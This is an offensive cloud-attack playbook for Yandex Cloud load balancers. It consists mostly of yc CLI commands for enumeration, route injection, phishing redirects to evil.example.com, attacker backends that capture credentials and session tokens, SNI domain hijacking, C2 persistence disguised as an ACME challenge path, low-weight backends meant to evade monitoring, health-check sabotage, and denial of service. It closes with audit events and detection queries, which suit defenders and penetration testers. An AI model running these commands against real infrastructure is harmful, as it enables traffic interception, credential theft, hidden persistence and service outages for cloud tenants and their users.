# Yandex Cloud - Load Balancers (NLB/ALB) Techniques

## Service Overview

Yandex Cloud provides two load balancer services: Network Load Balancer (NLB) operating at Layer 3/4, and Application Load Balancer (ALB) operating at Layer 7. ALB is the primary attack surface due to its HTTP-level traffic manipulation capabilities, TLS termination, and complex routing chain.

**Network Load Balancer (NLB) — Layer 3/4:**
- Distributes TCP/UDP traffic based on client address, port, and protocol
- No HTTP awareness — cannot inspect headers, URLs, cookies, or TLS content
- Two types: **external** (public IP) and **internal** (private IP only)
- Preserves client IP natively in network packets
- Key resources: Network Load Balancers, Target Groups

**Application Load Balancer (ALB) — Layer 7:**
- Five core resource types forming an attack chain: **Load Balancers** → **Listeners** (with SNI matches) → **HTTP Routers** → **Virtual Hosts** (with routes) → **Backend Groups** → **Target Groups**
- Performs TLS termination using certificates from Certificate Manager
- Supports SNI-based routing to map domains to different certificates and HTTP routers
- Can modify HTTP headers, rewrite URIs, issue redirects, and return static responses
- **Critical**: When using TLS to backends, the ALB **does not validate certificates returned by backends** — rogue backends with self-signed certs are accepted silently

---

## Enumeration

### Enumerate Network Load Balancers

```bash
# List all network load balancers
yc load-balancer network-load-balancer list

# Get details of a specific NLB
yc load-balancer network-load-balancer get <NLB-NAME|NLB-ID>

# List target groups
yc load-balancer target-group list

# Get target group details
yc load-balancer target-group get <TG-NAME|TG-ID>

# Check target health states
yc load-balancer network-load-balancer target-states <NLB-NAME|NLB-ID> \
  --target-group-id <TG-ID>

# List operations
yc load-balancer network-load-balancer list-operations <NLB-NAME|NLB-ID>
```

### Enumerate Application Load Balancers

```bash
# List all L7 load balancers
yc application-load-balancer load-balancer list

# Get details (listeners, SNI matches, security groups)
yc application-load-balancer load-balancer get <ALB-NAME|ALB-ID>

# List HTTP routers (reveals routing logic)
yc application-load-balancer http-router list
yc application-load-balancer http-router get <ROUTER-NAME|ROUTER-ID>

# List virtual hosts and their routes
yc application-load-balancer virtual-host list --http-router-name <ROUTER-NAME>
yc application-load-balancer virtual-host get <VHOST-NAME> \
  --http-router-name <ROUTER-NAME>

# List backend groups (reveals backend targets, weights, health checks)
yc application-load-balancer backend-group list
yc application-load-balancer backend-group get <BG-NAME|BG-ID>

# List target groups
yc application-load-balancer target-group list
yc application-load-balancer target-group get <TG-NAME|TG-ID>

# Check target health
yc application-load-balancer load-balancer target-states <ALB-NAME|ALB-ID> \
  --target-group-id <TG-ID> --backend-group-id <BG-ID>

# List operations
yc application-load-balancer load-balancer list-operations <ALB-NAME|ALB-ID>
```

### Enumerate TLS Certificates in Use

```bash
# Get ALB config as JSON to find certificate IDs
yc application-load-balancer load-balancer get <ALB-ID> --format json
# Look for certificate_ids in listener.tls and sni_handler configurations

# If you have certificate-manager.certificates.downloader:
yc certificate-manager certificate content --id <CERT-ID> \
  --chain chain.pem --key key.pem
```

---

## Lateral Movement

### Route Injection — Catch-All Traffic Interception

With `alb.editor`, inject a catch-all route that redirects all traffic to an attacker-controlled backend. The `prepend-http-route` command places the route **before** all existing routes, ensuring it matches first:

```bash
# Step 1: Create attacker target group (requires a VM in the VPC)
yc application-load-balancer target-group create \
  --name attacker-tg \
  --target subnet-id=<SUBNET-ID>,ip-address=<ATTACKER-VM-IP>

# Step 2: Create attacker backend group
yc application-load-balancer backend-group create --name attacker-bg
yc application-load-balancer backend-group add-http-backend \
  --backend-group-name attacker-bg \
  --name evil-backend \
  --port 8080 \
  --target-group-name attacker-tg \
  --weight 100

# Step 3: Prepend catch-all route (matches before all existing routes)
yc application-load-balancer virtual-host prepend-http-route evil-route \
  --http-router-name <TARGET-ROUTER> \
  --virtual-host-name <TARGET-VHOST> \
  --prefix-path-match / \
  --backend-group-name attacker-bg
```

### Redirect Traffic to Attacker Domain

```bash
# Add a redirect route that sends users to a phishing domain
yc application-load-balancer virtual-host prepend-http-route phishing-redirect \
  --http-router-name <TARGET-ROUTER> \
  --virtual-host-name <TARGET-VHOST> \
  --prefix-path-match /login \
  --redirect-host evil.example.com \
  --redirect-scheme https \
  --redirect-code 302
```

### Inject Attacker Backend into Existing Backend Group

Add an attacker backend to an existing backend group. The attacker VM acts as a transparent proxy — forwarding traffic to the real backend while capturing credentials and session tokens:

```bash
# Add attacker backend with high weight to steal most traffic
yc application-load-balancer backend-group add-http-backend \
  --backend-group-name <EXISTING-BG> \
  --name evil-backend \
  --port 443 \
  --target-group-name attacker-tg \
  --weight 1000

# Or modify existing backend to point to attacker targets
yc application-load-balancer backend-group update-http-backend \
  --backend-group-name <EXISTING-BG> \
  --name <EXISTING-BACKEND-NAME> \
  --target-group-name attacker-tg
```

### Host Header Rewrite

```bash
# Rewrite the Host header sent to backends
yc application-load-balancer virtual-host update-http-route <ROUTE-NAME> \
  --http-router-name <TARGET-ROUTER> \
  --virtual-host-name <TARGET-VHOST> \
  --host-rewrite evil.example.com \
  --backend-group-name <EXISTING-BG>
```

### SNI Routing Exploitation

SNI matches map domain names to specific TLS certificates and HTTP routers. Hijack specific domains:

```bash
# Add malicious SNI match intercepting a specific domain
yc application-load-balancer load-balancer add-sni <ALB-NAME> \
  --listener-name <LISTENER-NAME> \
  --sni-name evil-sni \
  --server-name target-app.example.com \
  --certificate-id <ATTACKER-CERT-ID> \
  --http-router-name <ATTACKER-ROUTER>

# Update existing SNI match to point to attacker router
yc application-load-balancer load-balancer update-sni <ALB-NAME> \
  --listener-name <LISTENER-NAME> \
  --sni-name <EXISTING-SNI-NAME> \
  --http-router-name <ATTACKER-ROUTER>
```

**Browser TLS reuse note**: Some browsers reuse TLS connections with the same IP if a certificate contains the necessary domain name. If an attacker controls a wildcard or multi-SAN certificate, they can potentially intercept traffic for other virtual hosts sharing the same ALB IP.

### NLB Target Manipulation

```bash
# Attach rogue target group to NLB
yc load-balancer network-load-balancer attach-target-group <NLB-NAME> \
  --target-group target-group-id=<ATTACKER-TG-ID>,healthcheck-name=hc,healthcheck-tcp-port=80

# Add attacker VMs to existing target group
yc load-balancer target-group add-targets <TG-NAME> \
  --target subnet-id=<SUBNET-ID>,address=<ATTACKER-VM-IP>
```

### Cross-Service Pivoting

- ALB backends can point to VMs in any subnet within the VPC — use the ALB as a pivot to reach otherwise isolated network segments
- ALB HTTP backend groups can point to Object Storage buckets — serve malicious content (XSS, phishing) via a trusted ALB endpoint
- If ALB is managed by a Kubernetes Ingress Controller, compromising the K8s namespace allows indirect ALB manipulation

---

## Persistence

### Hidden Route Injection

Create a persistent C2 callback channel through legitimate load balancer infrastructure using an obscure path:

```bash
# Append a route with a path mimicking certificate validation
yc application-load-balancer virtual-host append-http-route backdoor-route \
  --http-router-name <ROUTER> \
  --virtual-host-name <VHOST> \
  --exact-path-match /.well-known/acme-challenge/c2callback \
  --backend-group-name attacker-c2-bg
```

### SNI-Based Persistence

Add an SNI match for an attacker-controlled domain that resolves to the ALB's public IP:

```bash
# Attacker's domain resolves to ALB IP; SNI routes to attacker backend
yc application-load-balancer load-balancer add-sni <ALB-NAME> \
  --listener-name <LISTENER-NAME> \
  --sni-name persistence-sni \
  --server-name c2.attacker.com \
  --certificate-id <ATTACKER-CERT-ID> \
  --http-router-name attacker-router
```

All other traffic continues normally while `c2.attacker.com` routes to the attacker's backend.

### Low-Weight Backend Injection

Add an attacker backend with low weight for subtle, intermittent traffic capture:

```bash
# Only ~1% of traffic — subtle enough to avoid error rate monitoring
yc application-load-balancer backend-group add-http-backend \
  --backend-group-name <EXISTING-BG> \
  --name legitimate-sounding-backend \
  --port 443 \
  --target-group-name attacker-tg \
  --weight 1 \
  --enable-tls
```

### Health Check Manipulation

Manipulate health checks to force traffic away from legitimate backends toward attacker-controlled ones:

```bash
# Set impossible health check on legitimate backend
yc application-load-balancer backend-group update-http-backend \
  --backend-group-name <BG-NAME> \
  --name <BACKEND-NAME> \
  --http-healthcheck timeout=1ms,interval=1s,unhealthy-threshold=1,path=/nonexistent,port=1

# Disable panic mode so failed checks cause 503 (forces traffic to healthy attacker backend)
yc application-load-balancer backend-group update \
  --name <BG-NAME> \
  --panic-threshold 0
```

---

## Post-Exploitation

### Service Disruption

```bash
# Stop a load balancer (DoS)
yc application-load-balancer load-balancer stop <ALB-NAME>
yc load-balancer network-load-balancer stop <NLB-NAME>

# Delete a load balancer
yc application-load-balancer load-balancer delete <ALB-NAME>

# Remove listeners
yc load-balancer network-load-balancer remove-listener <NLB-NAME> \
  --listener-name <LISTENER-NAME>

# Detach target groups
yc load-balancer network-load-balancer detach-target-group <NLB-NAME> \
  --target-group-id <TG-ID>
```

### Zonal Shift Abuse

Force traffic to specific zones where attacker has compromised backends:

```bash
yc application-load-balancer load-balancer start-zonal-shift <ALB-NAME> \
  --zone ru-central1-a,ru-central1-b
```

---

## Network Considerations

| Service | Default Ports |
|---|---|
| ALB HTTP | 80 |
| ALB HTTPS | 443 |
| NLB | User-configured (any TCP/UDP port) |

- ALB requires security groups to be configured; `vpc.publicAdmin` needed for public IPs
- ALB nodes get internal IPs in each subnet — these can reach backend subnets
- NLB preserves client IP natively; ALB adds `X-Forwarded-For`

---

## Key IAM Roles

### Application Load Balancer

| Role | Capabilities |
|---|---|
| `alb.auditor` | View ALB resources and quotas |
| `alb.viewer` | Full read access to all ALB resources |
| `alb.user` | View + use ALB resources from other services |
| `alb.editor` | Create/modify/delete all ALB resources — **primary attack role** |
| `alb.admin` | Editor + manage internal NLBs + manage access bindings |

### Network Load Balancer

| Role | Capabilities |
|---|---|
| `load-balancer.auditor` | View NLB resources and quotas |
| `load-balancer.viewer` | View load balancers and target groups |
| `load-balancer.privateAdmin` | Create/update/delete NLBs and target groups (no public IP) |
| `load-balancer.editor` | privateAdmin + VPC network access (no public IP creation) |
| `load-balancer.admin` | Editor + create public IP addresses |

---

## Detection and Logging

### Audit Trail Events

**ALB Control Plane Events** (source: `apploadbalancer`):

| Event | Security Relevance |
|---|---|
| `CreateBackendGroup` / `UpdateBackendGroup` | Backend group manipulation |
| `AddBackendGroupBackend` | **HIGH** — injecting attacker backend |
| `UpdateBackendGroupBackend` | **HIGH** — redirecting existing backend |
| `RemoveBackendGroupBackend` | Removing legitimate backends |
| `CreateHttpRouter` / `UpdateHttpRouter` | Routing logic changes |
| `CreateVirtualHost` / `UpdateVirtualHost` | Virtual host manipulation |
| `UpdateVirtualHostRoute` / `RemoveVirtualHostRoute` | **HIGH** — route manipulation |
| `AddLoadBalancerSniMatch` / `UpdateLoadBalancerSniMatch` | **HIGH** — domain hijacking via SNI |
| `AddLoadBalancerListener` / `UpdateLoadBalancerListener` | Listener changes |
| `CreateTargetGroup` / `AddTargetGroupTargets` | **HIGH** — injecting attacker VMs |
| `StopLoadBalancer` | DoS via service disruption |
| `StartZonalShift` | Forcing traffic to specific zone |

**ALB Data Plane Events** (must be explicitly enabled):
- `LoadbalancerHTTPAccessLog` — HTTP request logging
- `LoadbalancerTCPAccessLog` — TCP request logging

**NLB Control Plane Events** (source: `loadbalancer`):

| Event | Security Relevance |
|---|---|
| `CreateNetworkLoadBalancer` / `UpdateNetworkLoadBalancer` | NLB lifecycle |
| `AttachNetworkLoadBalancerTargetGroup` | **HIGH** — attaching rogue targets |
| `DetachNetworkLoadBalancerTargetGroup` | Removing legitimate targets |
| `AddNetworkLoadBalancerListener` / `RemoveNetworkLoadBalancerListener` | Listener manipulation |
| `CreateTargetGroup` / `AddTargetGroupTargets` | **HIGH** — injecting attacker VMs |
| `StopNetworkLoadBalancer` | DoS |

### Key Detection Gaps

- **NLB has no data plane logging**: No per-request access logs, making traffic-level detection of NLB attacks significantly harder
- **ALB does not validate backend TLS certificates**: Rogue backends with self-signed certs generate no alert
- **ALB data plane events require explicit enablement**: Must be configured in Audit Trails
- **Audit trail delivery latency**: S3 destination batches ~5 minutes; Cloud Logging is near-real-time

### Detection Queries

**Detect backend injection**:
```
event_type LIKE "%AddBackendGroupBackend%" OR
event_type LIKE "%AddTargetGroupTargets%"
```

**Detect route manipulation**:
```
event_type LIKE "%UpdateVirtualHost%" OR
event_type LIKE "%UpdateVirtualHostRoute%"
```

**Detect SNI hijacking**:
```
event_type LIKE "%AddLoadBalancerSniMatch%" OR
event_type LIKE "%UpdateLoadBalancerSniMatch%"
```

**Detect unknown backend IPs in access logs**:
Monitor `backend_ip` field in ALB access logs against known backend inventory.

---

## References

- Application Load Balancer Documentation: `en/application-load-balancer/`
- ALB Concepts: `en/application-load-balancer/concepts/application-load-balancer.md`
- ALB HTTP Routers: `en/application-load-balancer/concepts/http-router.md`
- ALB Backend Groups: `en/application-load-balancer/concepts/backend-group.md`
- ALB Security: `en/application-load-balancer/security/index.md`
- ALB Log Reference: `en/application-load-balancer/logs-ref.md`
- Network Load Balancer Documentation: `en/network-load-balancer/`
- NLB Security: `en/network-load-balancer/security/index.md`
- ALB CLI Reference: `en/application-load-balancer/cli-ref/`
- NLB CLI Reference: `en/network-load-balancer/cli-ref/`
